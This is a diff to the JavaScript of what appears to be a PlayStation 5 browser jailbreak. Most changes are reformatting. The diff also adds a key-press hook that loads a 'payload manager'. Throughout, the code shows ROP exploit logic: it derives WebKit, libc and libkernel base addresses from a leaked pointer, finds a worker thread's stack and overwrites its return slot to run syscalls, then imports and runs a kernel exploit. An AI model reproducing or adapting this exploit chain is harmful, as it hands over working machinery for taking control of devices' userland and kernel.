@@ -7,6 +7,19 @@ function countFingerprints(p, stack, expected) {
   return count;
 }
 
+function watchR2(onPress) {
+  function onKey(event) {
+    if (event.key !== "F8" || event.code !== "Unidentified") return;
+    window.removeEventListener("keydown", onKey, true);
+    event.preventDefault();
+    onPress();
+  }
+
+  log("press R2 to load payload manager", "info");
+
+  window.addEventListener("keydown", onKey, true);
+}
+
 async function findWorkerStack(p, libKernelBase) {
   const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
   const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
@@ -34,22 +47,28 @@ async function findWorkerStack(p, libKernelBase) {
     thread = next;
   }
   if (stacks.length === 0)
-    throw new Error(`failed to find worker. (libkernel thread_list @ 0x${head.toString()}; scanned ${steps} thread nodes)`);
+    throw new Error(
+      `failed to find worker. (libkernel thread_list @ 0x${head.toString()}; scanned ${steps} thread nodes)`,
+    );
 
   // fingerprint-select. The rop_slave thread parks in the libkernel
   const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
   for (let attempt = 0; attempt < 50; attempt++) {
-    const hits = stacks.filter((stack) =>
-      countFingerprints(p, stack, expected) > 0,
+    const hits = stacks.filter(
+      (stack) => countFingerprints(p, stack, expected) > 0,
     );
     if (hits.length === 1) return hits[0];
     if (hits.length === 0) {
       await new Promise((resolve) => setTimeout(resolve, 1));
       continue;
     }
-    throw new Error(`worker-stack signature ambiguous: ${hits.length}/${stacks.length} plausible 0x80000 stacks are parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)}`);
+    throw new Error(
+      `worker-stack signature ambiguous: ${hits.length}/${stacks.length} plausible 0x80000 stacks are parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)}`,
+    );
   }
-  throw new Error(`no plausible 0x80000 stack parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)} after retries (${stacks.length} candidates scanned)`);
+  throw new Error(
+    `no plausible 0x80000 stack parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)} after retries (${stacks.length} candidates scanned)`,
+  );
 }
 
 async function findWorkerReturnSlot(p, stack, libKernelBase) {
@@ -73,7 +92,9 @@ async function findWorkerReturnSlot(p, stack, libKernelBase) {
     lastCount = count;
     await new Promise((resolve) => setTimeout(resolve, 1));
   }
-  throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
+  throw new Error(
+    `worker wait return fingerprint count ${lastCount}, expected 1`,
+  );
 }
 
 function log(message, type = "log") {
@@ -92,19 +113,32 @@ function jbmark(tag, detail) {
 async function prepareRop(p) {
   const ctor = globalThis.__ps5NativeCtor;
   let webkitBase;
-  if (typeof ctor === "number" && typeof OFFSET_wk_host_constructor_candidates !== "undefined") {
+  if (
+    typeof ctor === "number" &&
+    typeof OFFSET_wk_host_constructor_candidates !== "undefined"
+  ) {
     for (const offset of OFFSET_wk_host_constructor_candidates) {
       const candidate = ctor - offset;
-      if (candidate >= 0x800000000 && candidate < 0x900000000 && candidate % 0x4000 === 0) {
+      if (
+        candidate >= 0x800000000 &&
+        candidate < 0x900000000 &&
+        candidate % 0x4000 === 0
+      ) {
         webkitBase = candidate;
         break;
       }
     }
   }
   if (webkitBase === undefined)
-    throw new Error("no host-constructor candidate gave a valid base (ctor=0x" + String(ctor) + ")");
-  const libSceNKWebKitBase = new int64(webkitBase % 0x100000000,
-    Math.floor(webkitBase / 0x100000000));
+    throw new Error(
+      "no host-constructor candidate gave a valid base (ctor=0x" +
+        String(ctor) +
+        ")",
+    );
+  const libSceNKWebKitBase = new int64(
+    webkitBase % 0x100000000,
+    Math.floor(webkitBase / 0x100000000),
+  );
 
   let libSceLibcInternalBase = p.read8(
     libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
@@ -183,7 +217,11 @@ async function prepareRop(p) {
   const workerStack = await findWorkerStack(p, libKernelBase);
   const originalContext = malloc(0x40);
 
-  const returnAddress = await findWorkerReturnSlot(p, workerStack, libKernelBase);
+  const returnAddress = await findWorkerReturnSlot(
+    p,
+    workerStack,
+    libKernelBase,
+  );
   const originalReturnAddress = p.read8(returnAddress);
   const stackPointerSlot = returnAddress.add32(0x8);
 
@@ -218,7 +256,9 @@ async function prepareRop(p) {
     });
 
     if (!completed)
-      throw new Error(`the rop worker never answered in ${ROP_WAIT_MS / 1000}s - refusing to continue on a chain that never ran. (Reload.)`);
+      throw new Error(
+        `the rop worker never answered in ${ROP_WAIT_MS / 1000}s - refusing to continue on a chain that never ran. (Reload.)`,
+      );
   }
 
   const runtime = {
@@ -248,7 +288,9 @@ async function prepareRop(p) {
   p.write8(chain.return_value, JB_POISON);
   const pid = await chain.syscall(SYS_GETPID);
   if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
-    throw new Error("Worker chain did not execute; the return slot is unchanged.");
+    throw new Error(
+      "Worker chain did not execute; the return slot is unchanged.",
+    );
   }
 
   if (pid.low == 0) {
@@ -263,8 +305,7 @@ async function main(userlandRW) {
   const { p, chain } = await prepareRop(userlandRW);
   const { runKernelExploit } = await import("./relapse_exploit.js");
   const result = await runKernelExploit(p, chain, log);
-  if (!result || !result.done)
-    throw new Error("kernel exploit did not finish");
+  if (!result || !result.done) throw new Error("kernel exploit did not finish");
 
   if (result.payloads) {
     log("kernel exploit complete", "info");
